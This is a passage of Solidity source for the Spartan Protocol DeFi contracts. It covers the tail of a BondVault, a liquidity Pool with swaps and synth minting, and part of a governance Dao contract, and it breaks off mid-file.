iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        totalWeight -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: vault)\n        mapMember_weight[member] -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: user)\n        mapMemberPool_weight[member][_pool] = 0; // Zero out user weight (scope: user -> pool)\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][_pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Get the total count of all existing & past BondVault members\n    function memberCount() external view returns (uint256 count){\n        return arrayMembers.length;\n    }\n\n    // Get array of all existing & past BondVault members\n    function allMembers() external view returns (address[] memory _allMembers){\n        return arrayMembers;\n    }\n\n    function release() external onlyDAO {\n        bondRelease = true;\n    }\n\n    // Get a bond details (scope: user -> asset)\n    function getMemberDetails(address member, address asset) external view returns (MemberDetails memory memberDetails){\n        memberDetails.isMember = mapBondAsset_memberDetails[asset].isMember[member];\n        memberDetails.bondedLP = mapBondAsset_memberDetails[asset].bondedLP[member];\n        memberDetails.claimRate = mapBondAsset_memberDetails[asset].claimRate[member];\n        memberDetails.lastBlockTime = mapBondAsset_memberDetails[asset].lastBlockTime[member];\n        return memberDetails;\n    }\n\n    // Get a users's totalWeight (scope: user)\n    function getMemberWeight(address member) external view returns (uint256) {\n        if (mapMember_weight[member] > 0) {\n            return mapMember_weight[member];\n        } else {\n            return 0;\n        }\n    } \n}\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iSYNTH.sol\"; \nimport \"./interfaces/iSYNTHFACTORY.sol\"; \nimport \"./interfaces/iBEP677.sol\"; \n\ncontract Pool is iBEP20 {  \n    address public BASE;\n    address public TOKEN;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint256 public baseAmount; // SPARTA amount that should be in the pool\n    uint256 public tokenAmount; // TOKEN amount that should be in the pool\n\n    uint private lastMonth; // Timestamp of the start of current metric period (For UI)\n    uint public genesis; // Timestamp from when the pool was first deployed (For UI)\n\n    uint256 public map30DPoolRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DPoolRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    event AddLiquidity(address indexed member, uint inputBase, uint inputToken, uint unitsIssued);\n    event RemoveLiquidity(address indexed member, uint outputBase, uint outputToken, uint unitsClaimed);\n    event Swapped(address indexed tokenFrom, address indexed tokenTo, address indexed recipient, uint inputAmount, uint outputAmount, uint fee);\n    event MintSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n    event BurnSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    constructor (address _base, address _token) {\n        BASE = _base;\n        TOKEN = _token;\n        string memory poolName = \"-SpartanProtocolPool\";\n        string memory poolSymbol = \"-SPP\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), poolName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), poolSymbol));\n        decimals = 18;\n        genesis = block.timestamp;\n        DEPLOYER = msg.sender;\n        lastMonth = 0;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Max approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n      iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n      return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n      return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //====================================POOL FUNCTIONS =================================//\n\n    // User adds liquidity to the pool\n    function add() external returns(uint liquidityUnits){\n        liquidityUnits = addForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Contract adds liquidity for user \n    function addForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get the received SPARTA amount\n        uint256 _actualInputToken = _getAddedTokenAmount(); // Get the received TOKEN amount\n        if(baseAmount == 0 || tokenAmount == 0){\n        require(_actualInputBase != 0 && _actualInputToken != 0, \"!Balanced\");\n        }\n        liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply); // Calculate LP tokens to mint\n        _incrementPoolBalances(_actualInputBase, _actualInputToken); // Update recorded BASE and TOKEN amounts\n        _mint(member, liquidityUnits); // Mint the LP tokens directly to the user\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n    \n    // User removes liquidity from the pool \n    function remove() external returns (uint outputBase, uint outputToken) {\n        return removeForMember(msg.sender);\n    } \n\n    // Contract removes liquidity for the user\n    function removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n        outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n        outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n        _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n        _burn(address(this), _actualInputUnits); // Burn the LP tokens\n        iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n        iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n        emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n        return (outputBase, outputToken);\n    }\n\n    // Caller swaps tokens\n    function swap(address token) external returns (uint outputAmount, uint fee){\n        (outputAmount, fee) = swapTo(token, msg.sender);\n        return (outputAmount, fee);\n    }\n\n    // Contract swaps tokens for the member\n    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"!BASE||TOKEN\"); // Must be SPARTA or the pool's relevant TOKEN\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN; // If SPARTA is selected; swap from TOKEN\n            _amount = _getAddedTokenAmount(); // Get the received TOKEN amount\n            (outputAmount, fee) = _swapTokenToBase(_amount); // Calculate the SPARTA output from the swap\n        } else {\n            _fromToken = BASE; // If TOKEN is selected; swap from SPARTA\n            _amount = _getAddedBaseAmount(); // Get the received SPARTA amount\n            (outputAmount, fee) = _swapBaseToToken(_amount); // Calculate the TOKEN output from the swap\n        }\n        emit Swapped(_fromToken, token, member, _amount, outputAmount, fee);\n        iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user\n        return (outputAmount, fee);\n    }\n\n    // Swap SPARTA for Synths\n    function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n        uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n        uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n        _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n        uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n        fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n        _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n        iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n      return (output, fee);\n    }\n    \n    // Swap Synths for SPARTA\n    function burnSynth(address synthIN, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthIN) == true, \"!synth\"); // Must be a valid Synth\n        uint _actualInputSynth = iBEP20(synthIN).balanceOf(address(this)); // Get received SYNTH amount\n        uint outputBase = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputSynth, tokenAmount, baseAmount); // Calculate value of swapping relevant underlying TOKEN to SPARTA\n        fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputSynth, tokenAmount, baseAmount); // Calc slip fee in SPARTA\n        iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract\n        iSYNTH(synthIN).burnSynth(); // Burn the SYNTH units\n        _decrementPoolBalances(outputBase, 0); // Update recorded SPARTA amount\n        iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit BurnSynth(member, BASE, outputBase, TOKEN, _actualInputSynth);\n      return (outputBase, fee);\n    }\n\n    //=======================================INTERNAL MATHS======================================//\n\n    // Check the SPARTA amount received by this Pool\n    function _getAddedBaseAmount() internal view returns(uint256 _actual){\n        uint _baseBalance = iBEP20(BASE).balanceOf(address(this)); \n        if(_baseBalance > baseAmount){\n            _actual = _baseBalance-(baseAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n  \n    // Check the TOKEN amount received by this Pool\n    function _getAddedTokenAmount() internal view returns(uint256 _actual){\n        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); \n        if(_tokenBalance > tokenAmount){\n            _actual = _tokenBalance-(tokenAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    // Calculate output of swapping SPARTA for TOKEN & update recorded amounts\n    function _swapBaseToToken(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = baseAmount;\n        uint256 _Y = tokenAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n        uint fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc TOKEN fee\n        _fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, fee); // Convert TOKEN fee to SPARTA\n        _setPoolAmounts(_X + _x, _Y - _y); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    // Calculate output of swapping TOKEN for SPARTA & update recorded amounts\n    function _swapTokenToBase(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = tokenAmount;\n        uint256 _Y = baseAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc SPARTA output\n        _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc SPARTA fee\n        _setPoolAmounts(_Y - _y, _X + _x); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    //=======================================BALANCES=========================================//\n\n    // Sync internal balances to actual\n    function sync() external {\n        baseAmount = iBEP20(BASE).balanceOf(address(this));\n        tokenAmount = iBEP20(TOKEN).balanceOf(address(this));\n    }\n\n    // Increment internal balances\n    function _incrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount += _baseAmount;\n        tokenAmount += _tokenAmount;\n    }\n\n    // Set internal balances\n    function _setPoolAmounts(uint256 _baseAmount, uint256 _tokenAmount) internal  {\n        baseAmount = _baseAmount;\n        tokenAmount = _tokenAmount; \n    }\n\n    // Decrement internal balances\n    function _decrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount -= _baseAmount;\n        tokenAmount -= _tokenAmount; \n    }\n\n    //===========================================POOL FEE ROI=================================//\n\n    function _addPoolMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30Days\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DPoolRevenue = map30DPoolRevenue;\n            addRevenue(mapPast30DPoolRevenue);\n            map30DPoolRevenue = 0;\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address 